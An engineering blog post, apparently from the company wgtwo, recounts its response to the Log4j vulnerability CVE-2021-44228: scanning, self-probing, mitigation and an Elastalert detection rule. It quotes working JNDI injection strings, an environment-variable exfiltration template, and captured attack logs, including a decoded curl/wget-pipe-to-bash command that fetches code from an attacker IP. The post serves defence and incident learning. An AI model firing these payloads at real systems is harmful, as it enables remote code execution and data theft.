<a href="#we-are-hiring">We are hiring</a></p><h1>Friday</h1><p>Mitigating 3rd party vulnerabilities is an ability that <strong>wgtwo</strong> has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture.</p><p>We knew that all versions of Log4j <code>2.0-beta9 &lt;= Apache log4j &lt;= 2.14.1</code> were affected.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="code">Code<a class="hash-link" href="#code" title="Direct link to heading">​</a></h2><p>Naturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="docker-vulnerability-scan-day-1">Docker Vulnerability Scan Day 1<a class="hash-link" href="#docker-vulnerability-scan-day-1" title="Direct link to heading">​</a></h2><p>We use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry.</p><p>At a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy’s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified.</p><h1>Saturday</h1><h2 class="anchor anchorWithStickyNavbar_mojV" id="checking-our-infrastructure-ourselves-with-dns-requests">Checking our infrastructure ourselves with DNS requests<a class="hash-link" href="#checking-our-infrastructure-ourselves-with-dns-requests" title="Direct link to heading">​</a></h2><p>At that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.</p><p>One harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:</p><p><img src="/assets/images/01-canary-tokens-f983dacab054f367bad1da172173f916.png" width="1254" height="692"></p><p>If a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">curl https://docs.wgtwo.com  -A "\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}"</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>After executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.</p><p>JNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world.</p><p>Going back to our problem, we quickly found this <a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener noreferrer">Rogue JNDI</a>. This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:</p><p><img src="/assets/images/02-supported-payloads-a00c9b2b8c1fbe6da7493e687868530a.png" width="1242" height="392"></p><p>In particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Then, we should proceed to:
1) Identify if the affected components are in our stack or in the cloud provider
2) Apply mitigation</p><ul><li>Either via WAF - firewall rules on traffic.</li><li>Either via known mitigation on the log4g components<ul><li>Environment variable / JVM options</li><li>Java class removal</li><li>Full component upgrade</li></ul></li></ul><p>For (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j.</p><p>Assuming this was the only element, we proceed to apply mitigation:
We discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the <code>jndi:ldap</code> string used to trigger the vulnerability.
The environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.
Java class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="log-analysis-and-alerting">Log Analysis and Alerting<a class="hash-link" href="#log-analysis-and-alerting" title="Direct link to heading">​</a></h2><p>Just after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. <code>${jndi</code></p><p>Cloudflare wrote a great <a href="https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/" target="_blank" rel="noopener noreferrer">blog post</a> about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.</p><p>For us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by <a href="https://aws.amazon.com/security/security-bulletins/AWS-2021-006/" target="_blank" rel="noopener noreferrer">AWS Security Bulletin</a>.</p><p>To get some ChatOps alerts in slack we use an open-source tool called <a href="https://github.com/Yelp/elastalert" target="_blank" rel="noopener noreferrer">Elstalert</a>. This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure.</p><p>To get started, we built the following Elastalert rule:</p><div class="codeBlockContainer_I0IT language-yaml theme-code-block"><div class="codeBlockContent_wNvx yaml"><pre tabindex="0" class="prism-code language-yaml codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token key atrule">log4j.yaml</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">|</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">---</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">name</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"log4j cve"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">index</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> logstash</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">*</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> any</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">realert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query_string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"\"jndi:ldap\""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_delay</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"message"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> alert_text_only</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">include</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">"kubernetes.container.name"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">"message"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"slack"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> "</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Container*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">\n</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Message*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_args</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">"kubernetes.container.name"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">"message"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_channel_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"#cve-2021-44228"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_emoji_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">":unlock:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_msg_color</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> warning</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_title</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> Security RCE attempt for CVE</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">2021</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token number" style="color:rgb(247, 140, 108)">44228</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>We quickly then began to receive alerts of probing attempts across our environments.</p><p><img src="/assets/images/03-elastalert-b2d2c5d0c28cf3f09e30feb948e60320.png" width="1236" height="590"></p><p>The following alerts are <strong>unsuccessful</strong> exploit attempts our infrastructure.</p><p>Let’s take a closer look at some of these exploit attempts to see if we can learn anything..</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-10T14:05:52.612 Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET / HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">"45.155.205.233"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.155.205.233</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">12344</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Basic</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Command</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Base64</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"34b61b2d-28f6-4e89-9baf-7cd3b4e71698"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"54.217.173.83:443"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"-"</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>This request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:</p><p>base64</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>base64 decoded</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>If this attack was successful, we can see that the actor is attempting to download a malicious exploit first with <code>curl</code>, then attempt with <code>wget</code> and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from <a href="https://github.com/falcosecurity/falco" target="_blank" rel="noopener noreferrer">Falco</a>. In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.</p><p>Looking at more attempts, we started to see probing attempts using a 3rd party service using <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener noreferrer">Interactsh</a>.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token number" style="color:rgb(247, 140, 108)">16</span><span class="token plain">/Dec/2021:06:11:07 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET /?x=</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">j}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">n}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">i}</span><span class="token string" style="color:rgb(195, 232, 141)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">685</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.015</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">products-developer-portal-8080</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.98</span><span class="token plain">.133.224:8080 </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.014</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> 548d1132926fa0bc9904e12523d2f250 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">l}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">d}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">a}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">p}</span><span class="token plain">://</span><span class="token variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token plain">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">, </span><span class="token number" style="color:rgb(247, 140, 108)">173.249</span><span class="token plain">.19.100</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>We see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-14T22:57:36.722Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET / HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">"51.105.55.17"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.83.193.150</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">1389</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Exploit}</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"7c9223d6-2c81-491d-8564-10742cc90a9c"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"54.75.196.220"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"-"</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In our Tokyo region, we started to see a lot of requests from <code>x00.it</code> domain.</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx bash"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">14</span><span class="token plain">/Dec/2021:17:37:59 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&amp;page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&amp;search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">401</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">39</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 